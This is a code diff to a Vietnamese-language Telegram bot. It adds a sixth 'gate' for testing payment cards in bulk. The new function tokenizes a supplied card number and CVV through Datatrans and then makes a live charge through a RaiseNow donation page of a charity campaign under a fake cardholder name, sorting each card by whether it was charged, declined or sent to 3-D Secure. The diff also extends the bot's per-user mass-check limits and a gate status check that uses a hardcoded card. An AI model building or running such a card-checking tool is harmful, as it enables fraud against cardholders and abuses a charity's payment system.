@@ -160,7 +160,8 @@ def get_formatted_gate_name(gate_id):
         '2': "Charge 0.5$ V2 (Gate 2)",
         '3': "Charge 0.5$ V3 (Gate 3)",
         '4': "Charge 0.5$ V4 (Gate 4)",
-        '5': "Charge 0.5$-2.0$ (Gate 5)"
+        '5': "Charge 0.5$-2.0$ (Gate 5)",
+        '6': "Charge 0.5$ (Gate 6)"
     }
     
     ranges = load_json_file(GATE_RANGES_FILE)
@@ -676,6 +677,125 @@ def _check_card_gate5(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
         logger.error(f"Lỗi không xác định trong Gate 5 cho line '{line}': {e}", exc_info=True)
         return 'error', line, f"Lỗi hệ thống Gate 5: {e}", bin_info
 
+def _check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
+    """Logic cho Gate 6"""
+    try:
+        charge_value = _get_charge_value('6', custom_charge_amount)
+        # Step 1: Tokenize card
+        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
+        tokenize_payload = {
+            "mode": "TOKENIZE",
+            "formId": "250802205541759546",
+            "cardNumber": cc,
+            "cvv": cvv,
+            "paymentMethod": "ECA",
+            "merchantId": "3000022877",
+            "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+            "browserJavaEnabled": "false",
+            "browserLanguage": "vi-VN",
+            "browserColorDepth": "24",
+            "browserScreenHeight": "1152",
+            "browserScreenWidth": "2048",
+            "browserTZ": "-420"
+        }
+        tokenize_headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Origin": "https://pay.datatrans.com",
+            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+            "Pragma": "no-cache",
+            "Accept": "*/*"
+        }
+
+        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
+        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
+
+        try:
+            token_data = token_response.json()
+            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
+                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
+            transaction_id = token_data.get("transactionId")
+            if not transaction_id:
+                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
+        except json.JSONDecodeError:
+            if token_response.status_code != 200:
+                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
+            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
+
+        # Step 2: Make payment request
+        payment_url = "https://api.raisenow.io/payments"
+        payment_payload = {
+            "account_uuid": "aa5124b6-2912-4ba1-b8ce-f43915685214",
+            "test_mode": False,
+            "create_supporter": False,
+            "amount": {"currency": "CHF", "value": charge_value},
+            "supporter": {
+                "locale": "en",
+                "first_name": "Minh",
+                "last_name": "Nhat",
+                "email_permission": False,
+                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}
+            },
+            "raisenow_parameters": {
+                "analytics": {
+                    "channel": "paylink",
+                    "preselected_amount": "5000",
+                    "suggested_amounts": "[5000,10000,15000]",
+                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+                },
+                "solution": {"uuid": "d2c90617-8e65-4447-a5c3-c2975b1716c2", "name": "Campagne de dons mindsUP", "type": "donate"},
+                "product": {
+                    "name": "tamaro",
+                    "source_url": "https://donate.raisenow.io/fxdnk?lng=en",
+                    "uuid": "self-service",
+                    "version": "2.16.0"
+                },
+                "integration": {"donation_receipt_requested": "false"}
+            },
+            "custom_parameters": {"campaign_id": "mindsup", "campaign_subid": ""},
+            "payment_information": {
+                "brand_code": "eca",
+                "cardholder": "Minh Nhat",
+                "expiry_month": mes,
+                "expiry_year": ano,
+                "transaction_id": transaction_id
+            },
+            "profile": "eccfaccc-7730-4875-8aed-c8b2535ecc28",
+            "return_url": "https://donate.raisenow.io/fxdnk?lng=en&rnw-view=payment_result"
+        }
+        payment_headers = {
+            "Content-Type": "application/json",
+            "Origin": "https://donate.raisenow.io",
+            "Referer": "https://donate.raisenow.io/",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+            "Pragma": "no-cache",
+            "Accept": "*/*"
+        }
+
+        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
+
+        response_text = payment_response.text
+
+        if '{"message":"Forbidden"}' in response_text:
+            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
+
+        if '"payment_status":"succeeded"' in response_text:
+            return 'success', line, f'CHARGED_{charge_value}', bin_info
+        elif '"payment_status":"failed"' in response_text:
+            return 'decline', line, response_text, bin_info
+        elif '"action":{"action_type":"redirect"' in response_text:
+            return 'custom', line, response_text, bin_info
+        elif '"3d_secure_2"' in response_text:
+            return 'custom', line, response_text, bin_info
+        else:
+            return 'unknown', line, response_text, bin_info
+    except Exception as e:
+        logger.error(f"Lỗi không xác định trong Gate 6 cho line '{line}': {e}", exc_info=True)
+        return 'error', line, f"Lỗi hệ thống Gate 6: {e}", bin_info
+
 def check_card(line, cancellation_event=None, custom_charge_amount=None):
     if cancellation_event and cancellation_event.is_set():
         return 'cancelled', line, 'User cancelled', {}
@@ -760,6 +880,7 @@ def check_card(line, cancellation_event=None, custom_charge_amount=None):
             '3': _check_card_gate3,
             '4': _check_card_gate4,
             '5': _check_card_gate5,
+            '6': _check_card_gate6,
         }
         
         gate_func = gate_functions.get(active_gate, _check_card_gate1) # Mặc định về gate 1
@@ -886,7 +1007,7 @@ async def get_help_text(user: User, lang_code: str):
         "**Quản lý Bot:**\n"
         "🔹 `/on`, `/off` - Bật/Tắt bot.\n"
         "🔹 `/status` - Kiểm tra trạng thái các cổng check.\n"
-        "🔹 `/gate [1-5]` - Đổi cổng check.\n"
+        "🔹 `/gate [1-6]` - Đổi cổng check.\n"
         "🔹 `/setgate <id> <min> <max>` - Đặt khoảng charge cho cổng.\n"
         "🔹 `/stop <user_id>` - Dừng task của user.\n\n"
         "**Lệnh Check Admin:**\n"
@@ -996,10 +1117,10 @@ async def add_limit_command(update, context):
     save_json_file(LIMIT_FILE, limits)
     
     await update.message.reply_text(f"✅ **Cập nhật giới hạn /mass thành công!**\n\n"
-                                        f"👤 **User ID:** `{target_user_id_str}`\n"
-                                        f"📈 **Giới hạn cũ:** `{old_limit}`\n"
-                                        f"➕ **Đã thêm:** `{amount_to_add}`\n"
-                                        f"📊 **Tổng mới:** `{new_limit}`")
+                                      f"👤 **User ID:** `{target_user_id_str}`\n"
+                                      f"📈 **Giới hạn cũ:** `{old_limit}`\n"
+                                      f"➕ **Đã thêm:** `{amount_to_add}`\n"
+                                      f"📊 **Tổng mới:** `{new_limit}`")
 
 async def add_multi_limit_command(update, context):
     if update.effective_user.id != ADMIN_ID: return
@@ -1020,10 +1141,10 @@ async def add_multi_limit_command(update, context):
     save_json_file(MULTI_LIMIT_FILE, limits)
     
     await update.message.reply_text(f"✅ **Cập nhật giới hạn /multi thành công!**\n\n"
-                                        f"👤 **User ID:** `{target_user_id_str}`\n"
-                                        f"📈 **Giới hạn cũ:** `{old_limit}`\n"
-                                        f"➕ **Đã thêm:** `{amount_to_add}`\n"
-                                        f"📊 **Tổng mới:** `{new_limit}`")
+                                      f"👤 **User ID:** `{target_user_id_str}`\n"
+                                      f"📈 **Giới hạn cũ:** `{old_limit}`\n"
+                                      f"➕ **Đã thêm:** `{amount_to_add}`\n"
+                                      f"📊 **Tổng mới:** `{new_limit}`")
 
 async def bin_command(update, context):
     user = update.effective_user
@@ -1721,7 +1842,7 @@ def _perform_gate_check(gate_id: str, card_line: str):
         
         gate_functions = {
             '1': _check_card_gate1, '2': _check_card_gate2, '3': _check_card_gate3,
-            '4': _check_card_gate4, '5': _check_card_gate5,
+            '4': _check_card_gate4, '5': _check_card_gate5, '6': _check_card_gate6,
         }
         gate_func = gate_functions.get(gate_id)
         if not gate_func:
@@ -1752,7 +1873,7 @@ async def status_command(update, context):
     test_card = "4258818143133540|02|26|471" # Một thẻ test chung
 
     final_message = "**📊 TRẠNG THÁI CỔNG THANH TOÁN 📊**\n\n"
-    gate_ids = ['1', '2', '3', '4', '5']
+    gate_ids = ['1', '2', '3', '4', '5', '6']
     
     with ThreadPoolExecutor(max_workers=len(gate_ids)) as executor:
         future_to_gate = {executor.submit(_perform_gate_check, gid, test_card): gid for gid in gate_ids}
@@ -1787,16 +1908,16 @@ async def gate_command(update, context):
     if not context.args:
         current_gate = get_active_gate()
         current_gate_name = get_formatted_gate_name(current_gate)
-        await update.message.reply_text(f"ℹ️ Gate đang hoạt động: **{current_gate_name}**.\n\nDùng `/gate [1-5]` để thay đổi.")
+        await update.message.reply_text(f"ℹ️ Gate đang hoạt động: **{current_gate_name}**.\n\nDùng `/gate [1-6]` để thay đổi.")
         return
         
     new_gate = context.args[0]
-    if new_gate in ['1', '2', '3', '4', '5']:
+    if new_gate in ['1', '2', '3', '4', '5', '6']:
         set_active_gate(new_gate)
         new_gate_name = get_formatted_gate_name(new_gate)
         await update.message.reply_text(f"✅ Đã chuyển cổng thanh toán sang: **{new_gate_name}**")
     else:
-        await update.message.reply_text("❌ Cổng không hợp lệ. Vui lòng chọn `1`, `2`, `3`, `4` hoặc `5`.")
+        await update.message.reply_text("❌ Cổng không hợp lệ. Vui lòng chọn `1`, `2`, `3`, `4`, `5` hoặc `6`.")
 
 async def set_gate_range_command(update, context):
     """(Admin) Đặt khoảng charge cho một gate. /setgate <id> <min> <max>"""
@@ -1808,8 +1929,8 @@ async def set_gate_range_command(update, context):
         
     try:
         gate_id, min_str, max_str = context.args
-        if gate_id not in ['1', '2', '3', '4', '5']:
-            await update.message.reply_text("❌ `gate_id` phải từ 1 đến 5.")
+        if gate_id not in ['1', '2', '3', '4', '5', '6']:
+            await update.message.reply_text("❌ `gate_id` phải từ 1 đến 6.")
             return
         min_val = int(min_str)
         max_val = int(max_str)
